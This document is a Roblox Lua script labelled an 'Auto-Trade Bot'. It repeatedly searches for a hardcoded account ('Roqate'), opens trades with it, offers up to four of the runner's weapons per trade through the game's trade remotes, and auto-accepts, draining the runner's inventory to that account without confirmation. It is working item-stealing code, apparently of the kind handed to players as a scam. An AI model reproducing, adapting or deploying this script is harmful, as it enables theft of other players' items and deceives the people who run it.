-- Auto-Trade Bot Using GUI Frames
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 5
local ITEM_ADD_DELAY = 0.3

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

local isTrading = false
local lastTradeTime = 0

local function findPlayer(name)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == name:lower() then
            return player
        end
    end
    return nil
end

local function isTradeGUIOpen()
    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
end

-- Get weapons from GUI frame (ignores Default Knife/Gun)
local function getAllWeaponsFromGUI()
    local weapons = {}
    local gui = LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
    if gui then
        local gameFrame = gui:FindFirstChild("Game")
        if gameFrame then
            local weaponsFrame = gameFrame:FindFirstChild("Weapons")
            if weaponsFrame then
                for _, item in ipairs(weaponsFrame:GetDescendants()) do
                    if (item:IsA("TextButton") or item:IsA("ImageButton")) and item.Visible then
                        local name = item.Name
                        if name ~= "Default Knife" and name ~= "Default Gun" then
                            table.insert(weapons, name)
                            if #weapons >= MAX_ITEMS_PER_TRADE then
                                break
                            end
                        end
                    end
                end
            end
        end
    end
    return weapons
end

local function addWeaponsToTrade()
    local weapons = getAllWeaponsFromGUI()
    if #weapons == 0 then
        warn("No valid weapons found in GUI!")
        return false
    end

    for i = 1, math.min(#weapons, MAX_ITEMS_PER_TRADE) do
        TradeRemotes.OfferItem:FireServer(weapons[i], "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end
    
    return true
end

local function acceptTrade()
    if not isTradeGUIOpen() then
        warn("Trade GUI not open!")
        return false
    end
    TradeRemotes.AcceptTrade:FireServer(285646582)
    return true
end

local function initiateTrade(targetPlayer)
    if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then return end
    
    isTrading = true
    print("Starting trade with " .. targetPlayer.Name .. "...")
    
    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    
    if not success then
        warn("Trade request failed: " .. err)
        isTrading = false
        return
    end
    
    task.wait(1)
    
    if not isTradeGUIOpen() then
        warn("Trade GUI didn't open!")
        isTrading = false
        return
    end
    
    if not addWeaponsToTrade() then
        isTrading = false
        return
    end
    
    if not acceptTrade() then
        warn("Failed to accept trade!")
    else
        print("Trade with " .. targetPlayer.Name .. " completed!")
    end
    
    isTrading = false
    lastTradeTime = os.time()
end

while true do
    local target = findPlayer(TARGET_PLAYER)
    if target then
        initiateTrade(target)
    else
        print(TARGET_PLAYER .. " not found. Waiting...")
    end
    task.wait(5)
end
